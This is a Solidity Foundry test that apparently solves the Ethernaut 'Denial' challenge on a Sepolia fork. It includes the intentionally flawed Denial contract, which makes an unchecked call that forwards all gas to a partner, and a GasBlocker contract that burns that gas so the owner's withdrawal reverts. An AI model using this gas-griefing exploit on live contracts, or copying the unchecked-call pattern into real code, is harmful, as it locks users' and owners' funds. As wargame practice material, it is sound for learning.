// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract GasBlocker{
    receive() external payable {
        while (gasleft() > 20000) {
            gasleft();
        }
    }
}


contract DenialTest is Test{
    function setUp() public {
        vm.createSelectFork("sepolia", 5452619);
    }

    function test_denial() public {
        Denial denial = Denial(payable(0x276085f6F3D292e33B113d40395Da057ffA2E03a));
        GasBlocker gasBlocker = new GasBlocker();
        denial.setWithdrawPartner(address(gasBlocker));
        vm.startPrank(denial.owner());
        vm.expectRevert();
        denial.withdraw{gas: 1000000}(); // `gas` is required to pass the foundry test, without it can faill with OOM
    }
}
